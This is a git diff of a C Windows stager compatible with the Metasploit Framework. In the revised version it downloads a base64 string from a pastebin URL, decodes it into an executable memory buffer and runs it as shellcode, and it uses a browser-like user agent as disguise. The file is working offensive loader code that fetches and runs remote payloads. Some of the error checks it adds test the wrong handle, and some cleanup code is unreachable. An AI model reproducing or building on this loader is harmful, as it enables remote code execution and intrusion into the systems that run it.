@@ -1,10 +1,8 @@
 /*
- * A C-based stager client compat with the Metasploit Framework
- *    based on a discussion on the Metasploit Framework mailing list
+ * A C-based stager client compat with the Metasploit Framework.
  *
- * Sends an HTTP request to the designated host, searches for a startcode
- *    in the response, then reads in a length specifier, then n bytes of
- *    data (where n was determined by the length specifier).
+ * Reads a b64 encoded string from pastebin, treats it as shellcode, and
+ *    executes it.
  *
  * @author Dakota Nelson (dakota.w.nelson@gmail.com)
  *  based on a stager by Raphael Mudge (raffi@strategiccyber.com)
@@ -21,31 +19,11 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <wincrypt.h>
-//#include <cdecode.h>
-
-/* set up winhttp */
-HINTERNET winhttp_init() {
-  /* see:
-   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
-   * */
-  HINTERNET internet;
-  LPCWSTR userAgent = L"Test User Agent";
-  DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
-
-  /* userAgent is optional */
-  internet = WinHttpOpen(userAgent,
-                         accessType,
-                         WINHTTP_NO_PROXY_NAME,
-                         WINHTTP_NO_PROXY_BYPASS, 0);
-
-  return internet;
-}
 
 /* a quick routine to quit and report why we quit */
-void punt(HINTERNET internet, char * error) {
+void punt(char * error) {
   printf("Bad things: %s\n", error);
   printf("Official error: %lu\n", GetLastError());
-  WinHttpCloseHandle(internet);
   exit(1);
 }
 
@@ -61,7 +39,17 @@ int main(int argc, char * argv[]) {
   DWORD dwSize = 0;
   DWORD dwDownloaded = 0;
 
-  hSession = winhttp_init();
+  /* see:
+   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
+   * */
+  hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                         WINHTTP_NO_PROXY_NAME,
+                         WINHTTP_NO_PROXY_BYPASS, 0);
+
+  if(hRequest == NULL) {
+    punt("could not open HTTP session\n");
+  }
 
   /*if (argc != 3) {
     printf("%s [host] [port]\n", argv[0]);
@@ -75,20 +63,27 @@ int main(int argc, char * argv[]) {
   hConnect = WinHttpConnect(hSession, host,
                           INTERNET_DEFAULT_HTTP_PORT, 0);
 
+  if(hRequest == NULL) {
+    punt("could not open HTTP connection\n");
+    if (hSession) WinHttpCloseHandle(hSession);
+  }
+
   /* send HTTP GET to target host */
   LPCWSTR path = L"/raw.php?i=PDg27FPb";
 
   // if (hConnect)
   hRequest = WinHttpOpenRequest(hConnect,
-                                          L"GET",
-                                          path,
-                                          NULL,
-                                          WINHTTP_NO_REFERER,
-                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                          0);
+                                L"GET",
+                                path,
+                                NULL,
+                                WINHTTP_NO_REFERER,
+                                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                0);
 
   if(hRequest == NULL) {
-    punt(hSession, "could not open HTTP request\n");
+    punt("could not open HTTP request\n");
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
   }
 
   BOOL success = WinHttpSendRequest(hRequest, 
@@ -100,12 +95,18 @@ int main(int argc, char * argv[]) {
                                     0);
 
   if(!success) {
-    punt(hSession, "could not send HTTP request\n");
+    punt("could not send HTTP request\n");
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
   }
 
   /* receive response from server */
   if (!WinHttpReceiveResponse(hRequest, NULL)) {
-    punt(hSession, "no response received\n");
+    punt("no response received\n");
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
   }
 
   WinHttpQueryDataAvailable(hRequest, &dwSize);
@@ -124,70 +125,26 @@ int main(int argc, char * argv[]) {
   if (hConnect) WinHttpCloseHandle(hConnect);
   if (hSession) WinHttpCloseHandle(hSession);
 
-  /* search for start code in returned text */
-
-  // for now, assume it's the first 4 characters
-  // TODO add an actual substring search for the start sequence
-
-  /* read length immediately after start code */
-  /*size = atoi(pszOutBuffer);
-  printf("The length of the message is: %lu\n", size);
-
-  // find the b64-encoded code block, separated from the length specifier by
-  // a space
-
-  char *b64code = strchr(pszOutBuffer, L" ");
-  if(!b64code) {
-    // improperly formatted payload
-    printf("no space found\n");
-  }
-
-  printf("%s\n", b64code);*/
-
-  // (index of the space in the payload) + 1 to get start index of b64
-  /*DWORD b64index = (b64code - pszOutBuffer) + 1;
-
-  printf("b64 data starts at index %lu\n", b64index);*/
-
-  // TEST ENCODING TO SEE WHAT COMES OUT
-  /*
-  BYTE * toEncode = "This is a message.";
-  LPSTR encoded[500];
-
-  BOOL yay = CryptBinaryToString(toEncode, 28, CRYPT_STRING_BASE64, encoded, NULL);
-
-  if (!yay) {
-    printf("URGH\n");
-    printf("Official error: %lu\n", GetLastError());
-  }
-  printf("%s\n", encoded);
-  */
-
   BOOL win = CryptStringToBinary(pszOutBuffer, dwSize, CRYPT_STRING_BASE64,
                                  NULL, &size, NULL, NULL);
 
   /* allocate a RWX buffer */
   buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (buffer == NULL) {
-    punt(hSession, "could not allocate buffer\n");
+    punt("could not allocate buffer\n");
   }
 
   /* read <size> characters, b64 decode, then treat as code, and
    * toss our newly found shellcode into the buffer */
-  //base64_decodestate *b64state;
-  //base64_decode_block(b64code, size, buffer, b64state);
 
   win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64,
                                  buffer, &size, NULL, NULL);
 
   if(!win) {
-    printf("FAIL.\n");
-    printf("Official error: %lu\n", GetLastError());
+    printf("Could not decode pastebin b64 string.\n");
   }
-  printf("b64 string was: %s\n", buffer);
 
   free(pszOutBuffer);
-  //exit(0);
 
   /* cast our buffer as a function and call it */
   function = (void (*)())buffer;
